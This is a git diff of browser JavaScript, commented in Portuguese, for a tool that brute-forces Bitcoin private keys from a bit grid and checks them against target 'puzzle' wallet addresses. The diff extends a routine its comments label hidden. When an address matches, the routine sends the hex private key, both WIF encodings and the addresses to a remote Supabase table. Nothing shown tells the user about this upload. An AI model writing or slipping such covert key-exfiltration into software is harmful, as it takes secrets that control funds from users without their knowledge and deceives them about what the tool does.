@@ -122,7 +122,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const foundWalletsCache = new Set();
 
   // 🚀 VERIFICAÇÃO DE VENCEDOR (OCULTA)
-  window.checkTargetWallet = async function (hex) {
+  window.checkTargetWallet = async function (hex, extraData = {}) {
     if (!window.targetWallets || !hex) return;
     try {
       const lib = window.bitcoin || window.bitcoinjs;
@@ -139,12 +139,6 @@ document.addEventListener('DOMContentLoaded', () => {
       const keyPairU = lib.ECPair.fromPrivateKey(privKeyBuffer, { compressed: false });
       const { address: addrU } = lib.payments.p2pkh({ pubkey: keyPairU.publicKey });
 
-      // DEBUG MODE - DESABILITADO PARA ECONOMIZAR MEMÓRIA
-      const DEBUG_MODE = false;
-      if (DEBUG_MODE && hex.endsWith('1')) {
-        console.log(`[DEBUG] Hex: ${hex.slice(-4)}... | C: ${addrC} | U: ${addrU}`);
-      }
-
       const targetWallets = window.targetWallets;
       const indexC = targetWallets.indexOf(addrC);
       const indexU = targetWallets.indexOf(addrU);
@@ -155,19 +149,20 @@ document.addEventListener('DOMContentLoaded', () => {
 
         // 🚀 VERIFICA SE JÁ FOI ENCONTRADA ANTES
         if (foundWalletsCache.has(foundAddr)) {
-          console.log(`ℹ️ Carteira ${foundAddr} já foi encontrada anteriormente. Ignorando duplicata.`);
-          return; // Sai sem salvar novamente
+          return;
         }
 
         // 🚀 MARCA COMO ENCONTRADA
         foundWalletsCache.add(foundAddr);
 
-        const wif = await toWIF(hex, indexC !== -1);
+        const paddedHex = hex.padStart(64, '0');
+        const wifCompressed = await toWIF(paddedHex, true);
+        const wifUncompressed = await toWIF(paddedHex, false);
 
         console.log("%c🚀 [VITAL] CARTEIRA ALVO ENCONTRADA!", "color: gold; background: black; font-size: 24px; padding: 10px; border: 2px solid gold;");
 
         // 1. Salva no localStorage (não interrompe o sistema conforme pedido)
-        const winData = { hex, addr: foundAddr, puzzle: puzzleNum, wif, date: new Date().toISOString() };
+        const winData = { hex: paddedHex, addr: foundAddr, puzzle: puzzleNum, wifCompressed, wifUncompressed, date: new Date().toISOString() };
         localStorage.setItem('BTC_WINNER_' + Date.now(), JSON.stringify(winData));
 
         // 2. Incrementa contador de carteiras
@@ -177,8 +172,37 @@ document.addEventListener('DOMContentLoaded', () => {
 
         // 3. Integração com o Puzzles List (se existir)
         if (window.puzzlesModal && window.puzzlesModal.updateCount) {
-          // 🚀 CORREÇÃO: Deixa o updateCount calcular os puzzles únicos internamente
           window.puzzlesModal.updateCount();
+        }
+
+        // 4. Registro no Supabase (Puzzle Finder) com deduplicação
+        try {
+          if (window.PuzzleFinder && typeof window.PuzzleFinder.register === 'function') {
+            const mode = extraData.mode || (getMode ? getMode() : (document.querySelector('input[name="mode"]:checked')?.value || 'horizontal'));
+            
+            // 🚀 O preset real é SEMPRE o puzzleNum baseado na lista de carteiras
+            await window.PuzzleFinder.register({
+              preset: puzzleNum, 
+              hexPrivateKey: paddedHex,
+              wifCompressed,
+              wifUncompressed,
+              addressCompressed: addrC,
+              addressUncompressed: addrU,
+              mode,
+              matrixCoordinates: extraData.matrixCoordinates || null,
+              processingTimeMs: extraData.startTime ? (Date.now() - extraData.startTime) : (extraData.processingTimeMs || null),
+              linesProcessed: extraData.linesProcessed || null
+            });
+            console.log(`✅ Registro do Puzzle ${puzzleNum} na tabela "encontrados" concluído`);
+          } else {
+            console.log('ℹ️ PuzzleFinder não disponível — pulando registro remoto');
+          }
+        } catch (e) {
+          if (e.code === 'DUPLICATE_PUZZLE') {
+            console.log('ℹ️ Puzzle já existente no Supabase. Ignorando duplicata.');
+          } else {
+            console.warn('⚠️ Falha ao registrar puzzle no Supabase:', e.message || e);
+          }
         }
       }
     } catch (e) { 
@@ -262,8 +286,12 @@ document.addEventListener('DOMContentLoaded', () => {
     wifBox.value += wifCompressed + '\n';
     wifBoxUncompressed.value += wifUncompressed + '\n';
 
-    // 🚀 VERIFICAÇÃO OCULTA DE CARTEIRA ALVO
-    window.checkTargetWallet(hex);
+    // 🚀 VERIFICAÇÃO OCULTA DE CARTEIRA ALVO (INTEGRADA COM TABELA "ENCONTRADOS")
+    window.checkTargetWallet(hex, {
+      mode: getMode ? getMode() : 'manual',
+      startTime: null, // No modo manual não rastreamos tempo do mesmo jeito
+      linesProcessed: stateCounter ? Number(stateCounter) : null
+    });
 
     // 🥚 EGGS HUNTER: Adiciona WIFs para verificação de saldo
     if (window.EggsHunter) {
@@ -286,16 +314,32 @@ document.addEventListener('DOMContentLoaded', () => {
     const mode = getMode();
     const activeCells = mode === 'vertical' ? getActiveCellsVertical() : getActiveCells();
     const totalCells = activeCells.length;
-    const isRandomizeMode = mode === 'randomize';
+    const isRandomizeMode = mode === 'randomize' || mode === 'randomize_h' || mode === 'randomize_v';
     realValue = stateCounter;
 
     if (isRandomizeMode) {
+      // 🚀 MODO ALEATORIZAR (H/V): Gera valor aleatório dentro da range de bits
+      const maxVal = (1n << BigInt(totalCells)) - 1n;
+      let rnd = (BigInt(Math.floor(Math.random() * 0x7FFFFFFF)) << 32n) | BigInt(Math.floor(Math.random() * 0x7FFFFFFF));
+      rnd = rnd % (maxVal + 1n);
+      
+      const binary = rnd.toString(2).padStart(totalCells, '0');
+      const sortedCells = mode === 'randomize_v' || mode === 'vertical'
+        ? [...activeCells].sort((a, b) => {
+          if (a.col !== b.col) return b.col - a.col;
+          return b.row - a.row;
+        })
+        : [...activeCells].sort((a, b) => {
+          if (a.row !== b.row) return b.row - a.row;
+          return b.col - a.col;
+        });
+
       if (window.matrizAPI) {
         const newGridState = Array(256).fill(false);
         for (let i = 0; i < totalCells; i++) {
-          const cell = activeCells[i];
-          const idx = cell.row * 16 + cell.col;
-          newGridState[idx] = Math.random() < 0.5;
+          const cell = sortedCells[i];
+          const bitValue = binary[totalCells - 1 - i] === '1';
+          newGridState[cell.row * 16 + cell.col] = bitValue;
         }
         window.matrizAPI.setGridState(newGridState);
       }
@@ -304,7 +348,7 @@ document.addEventListener('DOMContentLoaded', () => {
       const sortedCells = mode === 'vertical'
         ? [...activeCells].sort((a, b) => {
           if (a.col !== b.col) return b.col - a.col;
-          return a.row - b.row;
+          return b.row - a.row;
         })
         : [...activeCells].sort((a, b) => {
           if (a.row !== b.row) return b.row - a.row;
